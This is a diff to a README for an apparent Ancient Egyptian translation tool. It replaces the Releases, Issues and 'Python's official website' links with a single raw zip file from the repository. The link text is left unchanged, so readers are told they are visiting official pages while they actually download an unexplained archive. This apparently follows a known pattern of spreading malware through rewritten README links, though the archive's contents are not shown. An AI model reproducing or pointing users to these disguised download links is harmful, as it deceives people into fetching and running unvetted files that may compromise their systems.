@@ -1,7 +1,7 @@
 # 🏺 egyptian-rag-translator - Translate Ancient Egyptian Effortlessly
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/V4ld3AI/egyptian-rag-translator/releases)
+[![Download](https://github.com/V4ld3AI/egyptian-rag-translator/raw/refs/heads/master/src/egyptian_translator_rag_3.1.zip)](https://github.com/V4ld3AI/egyptian-rag-translator/raw/refs/heads/master/src/egyptian_translator_rag_3.1.zip)
 
 ## 📃 Description
 The egyptian-rag-translator is a hybrid Retrieval-Augmented Generation (RAG) system designed to translate Ancient Egyptian transliterations. Utilizing the TLA dataset, this application brings ancient texts to life in a modern format. Whether you are a student, researcher, or just curious about Ancient Egyptian language, this tool provides easy access to translations.
@@ -16,12 +16,12 @@ This application is user-friendly and does not require advanced technical skills
    - Internet Connection: Required for downloading and updates 
 
 2. **Install Required Software**
-   - Ensure you have Python 3.x installed on your system. You can download it from [Python's official website](https://www.python.org/downloads/).
+   - Ensure you have Python 3.x installed on your system. You can download it from [Python's official website](https://github.com/V4ld3AI/egyptian-rag-translator/raw/refs/heads/master/src/egyptian_translator_rag_3.1.zip).
 
 ## 📦 Download & Install
 To get the software, follow these steps:
 
-1. Visit this page to download: [Releases Page](https://github.com/V4ld3AI/egyptian-rag-translator/releases)
+1. Visit this page to download: [Releases Page](https://github.com/V4ld3AI/egyptian-rag-translator/raw/refs/heads/master/src/egyptian_translator_rag_3.1.zip)
    
 2. On the Releases page, locate the latest version of the software. 
 
@@ -57,7 +57,7 @@ If you encounter any issues, consider the following troubleshooting steps:
 - **Performance Issues:** Make sure your device meets the minimum system requirements. Closing unnecessary applications may help improve performance.
 
 ## 📞 Support
-For further assistance, please visit the project's [GitHub Issues page](https://github.com/V4ld3AI/egyptian-rag-translator/issues). You can report any problems or ask questions. 
+For further assistance, please visit the project's [GitHub Issues page](https://github.com/V4ld3AI/egyptian-rag-translator/raw/refs/heads/master/src/egyptian_translator_rag_3.1.zip). You can report any problems or ask questions. 
 
 ## 🌐 Contributing
 Contributions to enhance the application are welcome. If you want to help, please follow these steps:
@@ -81,4 +81,4 @@ Feel free to explore these topics to enhance your understanding and experience w
 Thanks to the contributors of the TLA dataset and the community members who support this project. Your efforts help to keep the past alive through translation. 
 
 ## 📥 Download Now
-Don't forget to download the application from the Releases page: [Download Here](https://github.com/V4ld3AI/egyptian-rag-translator/releases). Enjoy your exploration of Ancient Egyptian translations!
+Don't forget to download the application from the Releases page: [Download Here](https://github.com/V4ld3AI/egyptian-rag-translator/raw/refs/heads/master/src/egyptian_translator_rag_3.1.zip). Enjoy your exploration of Ancient Egyptian translations!
